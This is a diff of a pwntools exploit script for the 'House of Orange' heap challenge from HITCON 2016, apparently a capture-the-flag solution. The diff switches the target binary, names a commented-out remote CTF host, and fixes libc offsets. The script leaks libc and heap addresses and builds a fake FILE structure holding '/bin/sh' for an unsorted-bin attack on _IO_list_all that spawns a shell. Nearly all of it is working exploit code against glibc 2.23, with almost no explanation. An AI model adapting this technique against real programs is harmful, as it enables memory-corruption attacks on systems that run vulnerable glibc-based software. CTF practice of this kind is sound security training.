@@ -19,11 +19,12 @@ def gdba(x=''):
 	elif type(p)==pwnlib.tubes.process.process:
 		gdb.attach(p,x)
 		pause()
-p=process('houseoforange_hitcon_2016')
-libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
-pid=proc.pidof(p)[0]
-print('pid:',pid)
-# gdb.attach(proc.pidof(p)[0])
+p=process('orange')
+# p = remote('ctf.v50to.cc',10418)
+libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
+# pid=proc.pidof(p)[0]
+# print('pid:',pid)
+gdb.attach(proc.pidof(p)[0])
 pause()
 
 def add(size,name):
@@ -57,7 +58,8 @@ see()
 libcbase=u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
 print('libcbase',hex(libcbase))
 libcbase=libcbase-1601-0x3c4b20
-_IO_list_all=libcbase+libc.sym['_IO_2_1_stderr_']+0x7f9c25139540-0x7f9c25138540
+_IO_list_all=libcbase+libc.sym['_IO_list_all']
+# _IO_list_all=libcbase+libc.sym['_IO_2_1_stderr_']+0x7f9c25139540-0x7f9c25138540
 print('_IO_list_all',hex(_IO_list_all))
 # libcbase=libcbase-libc.sym
 print('libcbase',hex(libcbase))
@@ -70,11 +72,11 @@ rc(0x20)
 heapbase=u64(rc(6).ljust(8,b'\x00'))-0xc0
 print('heapbase',hex(heapbase))
 # ita()
-gdb.attach(proc.pidof(p)[0])
+# gdb.attach(proc.pidof(p)[0])
 
 
 payload=b'a'*0x400+p64(0)+p64(0x21)+b'a'*0x10
-fake_file=b'/bin/sh\x00'+p64(0x60)
+fake_file=b'/bin/sh\x00'+p64(0x61)
 fake_file+=p64(0)+p64(_IO_list_all-0x10)#unsorted bin attack
 fake_file+=p64(0)+p64(1)#IO_write_ptr>IO_write_base
 fake_file=fake_file.ljust(0xc0,b'\x00')#_mode=0
